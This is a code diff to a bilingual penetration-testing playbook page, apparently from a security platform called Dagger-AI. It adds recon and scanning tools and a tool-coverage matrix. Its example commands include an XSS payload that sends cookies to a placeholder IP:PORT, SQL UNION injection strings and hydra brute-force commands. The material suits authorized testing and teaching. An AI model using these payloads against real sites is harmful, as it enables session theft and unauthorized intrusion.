@@ -178,13 +178,13 @@ const PB_PHASES = [
     goalZh:"在不直接触碰目标的前提下,尽可能多地收集公开信息:域名、子域、证书、技术栈、暴露资产与人员情报。",
     tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0043 Recon"],
     tasks:[
-      {k:"2.1",en:"WHOIS / DNS",zh:"WHOIS / DNS 情报",tools:["whois","nslookup","dig","dnsrecon","DNSDumpster"],
+      {k:"2.1",en:"WHOIS / DNS",zh:"WHOIS / DNS 情报",tools:["whois","nslookup","dig","dnsx","dnsrecon","DNSDumpster"],
         cmds:["whois tryhackme.com","dig tryhackme.com A / MX / TXT","nslookup -type=MX tryhackme.com 1.1.1.1"]},
-      {k:"2.2",en:"Subdomain enum",zh:"子域枚举",tools:["crt.sh","Sublist3r","theHarvester","amass"],
+      {k:"2.2",en:"Subdomain enum",zh:"子域枚举",tools:["crt.sh","subfinder","Sublist3r","theHarvester","amass"],
         cmds:["./sublist3r.py -d acmeitsupport.thm","crt.sh  # certificate transparency logs"]},
       {k:"2.3",en:"Search-engine dorking",zh:"搜索引擎 / Dorking",tools:["site:","inurl:","filetype:","intitle:","Wayback","GitHub"],
         cmds:["site:target.com filetype:pdf","inurl:admin  ·  intitle:admin"]},
-      {k:"2.4",en:"Tech fingerprint",zh:"技术栈指纹",tools:["Wappalyzer","whatweb","BuiltWith"]},
+      {k:"2.4",en:"Tech fingerprint",zh:"技术栈指纹",tools:["Wappalyzer","whatweb","httpx","BuiltWith"]},
       {k:"2.5",en:"Exposure & people",zh:"暴露资产 / 人员",tools:["Shodan","Censys","Maltego","theHarvester"]},
     ]},
   { n:"03", id:"enum", kind:"recon", flag:"active", en:"Enumeration & Scanning", zh:"枚举与扫描",
@@ -195,15 +195,17 @@ const PB_PHASES = [
     tasks:[
       {k:"3.1",en:"Host discovery",zh:"主机发现",tools:["nmap -sn","ping","traceroute","arp"],
         cmds:["nmap -sn 10.10.0.0/24  # ARP/ICMP/TCP/UDP","traceroute / tracert <target>"]},
-      {k:"3.2",en:"Port scanning",zh:"端口扫描",tools:["nmap -sS","-sT","-sU","-sN/-sF/-sX","-sA/-sW","masscan"],
+      {k:"3.2",en:"Port scanning",zh:"端口扫描",tools:["nmap -sS","-sT","-sU","-sN/-sF/-sX","-sA/-sW","naabu","masscan"],
         cmds:["sudo nmap -sS $IP   # SYN (default)","sudo nmap -sU $IP   # UDP","sudo nmap -sN/-sF/-sX $IP  # stealth"]},
       {k:"3.3",en:"Service / OS detection",zh:"服务与 OS 识别",tools:["nmap -sV","-O","-A","whatweb","httpx"],
         cmds:["nmap -sV --version-light $IP","nmap -A $IP   # -sV -O -sC --traceroute"]},
-      {k:"3.4",en:"Content discovery",zh:"内容发现",tools:["ffuf","gobuster","dirb","SecLists","favicon hash","sitemap.xml","curl -v"],
+      {k:"3.4",en:"Content discovery",zh:"内容发现",tools:["ffuf","katana","gau","gobuster","dirb","SecLists","favicon hash","sitemap.xml","curl -v"],
         cmds:["ffuf -w SecLists/... -u http://$IP/FUZZ","curl http://$IP -v   # Server / lang headers"]},
       {k:"3.5",en:"Virtual-host fuzzing",zh:"虚拟主机 VHost",tools:["ffuf -H Host:"],
         cmds:["ffuf -w namelist.txt -H \"Host: FUZZ.site.thm\" -u http://$IP -fs {size}"]},
       {k:"3.6",en:"Web vuln scan",zh:"Web 漏洞扫描",tools:["nuclei","nikto"]},
+      {k:"3.7",en:"TLS / SSL review",zh:"TLS/SSL 核查",tools:["sslscan","testssl.sh","tlsx"],
+        cmds:["sslscan --no-colour host:443","testssl.sh --fast host  # Heartbleed / weak ciphers / cert","tlsx -u host:443 -expired -self-signed -mismatched"]},
     ]},
   { n:"04", id:"vuln", kind:"exec", en:"Threat Modeling & Vuln Analysis", zh:"威胁建模 · 漏洞分析",
     subEn:"Map findings to attack paths, confirm vulns", subZh:"把发现映射成攻击路径,识别并确认漏洞",
@@ -228,8 +230,8 @@ const PB_PHASES = [
         cmds:["ffuf -w names.txt -d \"username=FUZZ...\" -mr \"already exists\"","hydra -l user -P wordlist.txt $IP service"]},
       {k:"5.2",en:"SQL injection",zh:"SQL 注入",tools:["sqlmap","Burp","UNION-based","Error-based"],
         cmds:["0 UNION SELECT 1,2,database()","UNION SELECT ...group_concat(table_name) FROM information_schema.tables"]},
-      {k:"5.3",en:"Command injection",zh:"命令注入",tools:["whoami/ls/dir","ping/sleep/timeout","nc","OS_Command_Payload_List"]},
-      {k:"5.4",en:"XSS (Reflected/Stored/DOM/Blind)",zh:"跨站脚本 XSS",tools:["XSS Hunter","polyglot payloads"],
+      {k:"5.3",en:"Command injection",zh:"命令注入",tools:["commix","whoami/ls/dir","ping/sleep/timeout","nc","OS_Command_Payload_List"]},
+      {k:"5.4",en:"XSS (Reflected/Stored/DOM/Blind)",zh:"跨站脚本 XSS",tools:["dalfox","XSS Hunter","polyglot payloads"],
         cmds:["<script>fetch('http://IP:PORT?c='+btoa(document.cookie))</script>"]},
       {k:"5.5",en:"File inclusion LFI/RFI",zh:"文件包含 LFI/RFI",tools:[{en:"../ traversal",zh:"../ 路径穿越"},"%00","php wrappers","php reverse shell"]},
       {k:"5.6",en:"SSRF · IDOR · Race",zh:"SSRF · IDOR · 竞争条件",tools:[{en:"Burp Repeater (parallel)",zh:"Burp Repeater (并行)"},{en:"param tampering",zh:"参数篡改"},{en:"id enumeration",zh:"id 遍历"}]},
@@ -264,6 +266,98 @@ const PB_PHASES = [
       {k:"7.4",en:"Report & retest",zh:"报告撰写 & 复测",tools:["SysReptor","Dradis","Serpico",{en:"template",zh:"模板"},"Retest"]},
     ]},
 ];
+
+/* ---------- Tool coverage: every tool in this methodology, and whether
+   Dagger-AI integrates it — with the reason when it doesn't. [phase, name,
+   status, en-note, zh-note]. status: in=integrated · cov=covered by another
+   integrated tool · cand=candidate (could add next) · no=not integrated. */
+const PB_TOOLS = [
+  ["pre","Scoping · RoE · authorization","no","Process, not a binary — enforced by the platform's authorization gate (no campaign runs without an authorization note).","流程而非工具 —— 由平台的授权门禁强制：没有授权说明就无法发起战役。"],
+
+  ["osint","subfinder","in","Sidecar — passive subdomain enumeration.","sidecar —— 被动子域枚举。"],
+  ["osint","theHarvester","in","Sidecar — emails & subdomains from crt.sh / otx / bing…","sidecar —— 从 crt.sh / otx / bing 等聚合邮箱与子域。"],
+  ["osint","dnsx","in","Sidecar — DNS resolution & records.","sidecar —— DNS 解析与记录。"],
+  ["osint","gau","in","Sidecar — historical URL discovery.","sidecar —— 历史 URL 发现。"],
+  ["osint","crt.sh (CT logs)","cov","Covered — queried through theHarvester's crtsh source.","已覆盖 —— 经 theHarvester 的 crtsh 源查询。"],
+  ["osint","Wappalyzer / BuiltWith","cov","Covered — whatweb + httpx tech detection.","已覆盖 —— whatweb + httpx 技术识别。"],
+  ["osint","amass","cand","Candidate — deeper subdomain/asset mapping; a natural next addition.","候选 —— 更深的子域/资产测绘；适合作为下一个补充。"],
+  ["osint","Shodan / Censys","no","Needs a paid API key; an external data source rather than an active tool.","需付费 API key；属外部数据源而非主动工具。"],
+  ["osint","Maltego","no","GUI, analyst-driven graph analysis — not automatable headless.","图形化、依赖分析师的图谱分析 —— 无法无头自动化。"],
+  ["osint","Search-engine dorking","no","Manual query craft; no stable API to drive.","人工构造查询；没有稳定 API 可驱动。"],
+
+  ["enum","nmap","in","Sidecar — ports + service/version detection.","sidecar —— 端口 + 服务/版本识别。"],
+  ["enum","naabu","in","Sidecar — fast top-1000 TCP port discovery. (added this round)","sidecar —— 快速 top-1000 TCP 端口发现。（本次新增）"],
+  ["enum","httpx","in","Sidecar — web probe / tech detect.","sidecar —— Web 探测 / 技术识别。"],
+  ["enum","ffuf","in","Sidecar — content & virtual-host discovery.","sidecar —— 内容与虚拟主机发现。"],
+  ["enum","katana","in","Sidecar — crawl / URL discovery.","sidecar —— 爬取 / URL 发现。"],
+  ["enum","wafw00f","in","Sidecar — WAF detection.","sidecar —— WAF 检测。"],
+  ["enum","nikto","in","Sidecar — web-server scan.","sidecar —— Web 服务器扫描。"],
+  ["enum","masscan","cov","Covered — naabu provides the fast port sweep.","已覆盖 —— naabu 提供快速端口扫描。"],
+  ["enum","gobuster / dirb","cov","Covered — ffuf handles content discovery.","已覆盖 —— 由 ffuf 负责内容发现。"],
+
+  ["analysis","nuclei","in","Sidecar — templated CVE / misconfig scan.","sidecar —— 模板化 CVE / 配置扫描。"],
+  ["analysis","searchsploit","in","Sidecar — Exploit-DB intel from detected product/versions. (added this round)","sidecar —— 由识别到的产品/版本查 Exploit-DB。（本次新增）"],
+  ["analysis","tlsx","in","Sidecar — TLS fingerprint & certificate hygiene. (added this round)","sidecar —— TLS 指纹与证书核查。（本次新增）"],
+  ["analysis","sslscan / testssl.sh","in","Sidecar — TLS protocol/cipher & known TLS vulns.","sidecar —— TLS 协议/套件与已知 TLS 漏洞。"],
+  ["analysis","wpscan","in","Sidecar — WordPress core/plugin/theme vulns.","sidecar —— WordPress 核心/插件/主题漏洞。"],
+  ["analysis","arjun","in","Sidecar — hidden-parameter discovery.","sidecar —— 隐藏参数发现。"],
+  ["analysis","git / secret scan","in","Sidecar — exposed .git → git-dumper + gitleaks/trufflehog.","sidecar —— 暴露 .git → git-dumper + gitleaks/trufflehog。"],
+  ["analysis","Nessus","no","Commercial, licensed, heavyweight appliance.","商业授权、重型设备。"],
+  ["analysis","OpenVAS","no","Heavyweight deployment; against the lightweight self-hosted model.","部署重；不符合轻量自托管模型。"],
+  ["analysis","Burp Suite","no","Interactive proxy, analyst-driven; not headless-automatable.","交互式代理、依赖人工；无法无头自动化。"],
+
+  ["exploit","Built-in web probes","in","In-process OWASP probes (SQLi / cmdi / SSRF / XSS / IDOR…).","进程内 OWASP 探针（SQLi / 命令注入 / SSRF / XSS / IDOR…）。"],
+  ["exploit","sqlmap","in","Sidecar — SQL-injection validation.","sidecar —— SQL 注入验证。"],
+  ["exploit","dalfox","in","Sidecar — XSS validation.","sidecar —— XSS 验证。"],
+  ["exploit","commix","in","Sidecar — command-injection validation.","sidecar —— 命令注入验证。"],
+  ["exploit","OWASP ZAP","in","Sidecar — automated DAST.","sidecar —— 自动化 DAST。"],
+  ["exploit","Hydra / medusa","cand","Candidate — credential brute-forcing; noisy & higher-risk, planned behind an explicit opt-in.","候选 —— 认证爆破；噪声大、风险高，计划做成显式开关。"],
+  ["exploit","Metasploit / msfvenom","no","Weaponized exploitation framework; by design the platform stops at a benign PoC → foothold, not weaponized payloads.","武器化利用框架；平台按设计只做良性 PoC 到立足点，不做武器化载荷。"],
+  ["exploit","CrackStation / online crackers","no","External online service.","外部在线服务。"],
+
+  ["post","LinPEAS / WinPEAS","no","Needs an interactive shell on a compromised host — beyond the PoC-to-foothold scope.","需在已拿下的主机上有交互式 shell —— 超出 PoC-到-立足点 的范围。"],
+  ["post","Mimikatz","no","Post-compromise credential theft; out of scope.","拿下后的凭证窃取；范围外。"],
+  ["post","Pivoting / C2","no","The platform does not establish persistent command-and-control.","平台不建立持久 C2。"],
+
+  ["report","SysReptor / Dradis / Serpico","cov","Covered — the platform generates its own risk-ranked report.","已覆盖 —— 平台自带按风险排序的报告生成。"],
+];
+
+const PB_TOOL_PHASES = [
+  ["pre","Pre-engagement","前期交互"], ["osint","Recon (OSINT)","信息收集"],
+  ["enum","Enumeration","枚举与扫描"], ["analysis","Vuln analysis","漏洞分析"],
+  ["exploit","Exploitation","漏洞利用"], ["post","Post-exploitation","后渗透"],
+  ["report","Reporting","报告"],
+];
+const PB_TOOL_ST = {
+  in:   {cls:"ok",   en:"Integrated",     zh:"已集成"},
+  cov:  {cls:"ok",   en:"Covered",        zh:"已覆盖"},
+  cand: {cls:"cand", en:"Candidate",      zh:"候选"},
+  no:   {cls:"no",   en:"Not integrated", zh:"未集成"},
+};
+
+function pbToolsHTML(){
+  const nIn = PB_TOOLS.filter(t=>t[2]==="in"||t[2]==="cov").length;
+  const legend = Object.entries(PB_TOOL_ST).map(([k,v])=>
+    `<span><span class="pb-st ${v.cls}">${zh()?v.zh:v.en}</span></span>`).join("");
+  const groups = PB_TOOL_PHASES.map(([pid,pen,pzh])=>{
+    const rows = PB_TOOLS.filter(t=>t[0]===pid).map(([_,name,st,en,zhn])=>{
+      const s = PB_TOOL_ST[st];
+      return `<div class="pb-cov-row">
+        <span class="pb-st ${s.cls}">${zh()?s.zh:s.en}</span>
+        <span class="pb-cov-name">${esc(name)}</span>
+        <span class="pb-cov-note">${esc(zh()?zhn:en)}</span></div>`;
+    }).join("");
+    return rows ? `<div class="pb-cov-g"><h3>${esc(zh()?pzh:pen)}</h3>${rows}</div>` : "";
+  }).join("");
+  const title = zh()?"工具覆盖矩阵":"Tool coverage";
+  const lead = zh()
+    ? `本图谱涉及的全部工具及其在 Dagger-AI 的集成状态：已集成 / 已覆盖 ${nIn} 项，其余标注未集成的原因。`
+    : `Every tool in this methodology and its status in Dagger-AI: ${nIn} integrated or covered, the rest annotated with why not.`;
+  return `<div class="pb-cov">
+    <h2>${title}</h2><p class="lead2">${lead}</p>
+    <div class="pb-cov-legend">${legend}</div>
+    ${groups}</div>`;
+}
 
 function pbTaskHTML(tk){
   const title = zh() ? tk.zh : tk.en, sub = zh() ? tk.en : tk.zh;
@@ -324,7 +418,8 @@ function viewPlaybook(){
       </div>
     </div>
     <div class="panel pb-align"><div class="pb-align-scroll"><table class="pb-fw"><thead>${fwHead}</thead><tbody>${fwRows}</tbody></table></div></div>
-    <div class="pb-spine">${PB_PHASES.map(pbPhaseHTML).join("")}</div>`;
+    <div class="pb-spine">${PB_PHASES.map(pbPhaseHTML).join("")}</div>
+    ${pbToolsHTML()}`;
 
   const togglePhase = ph => { const c = ph.classList.toggle("collapsed");
     ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!c)); };
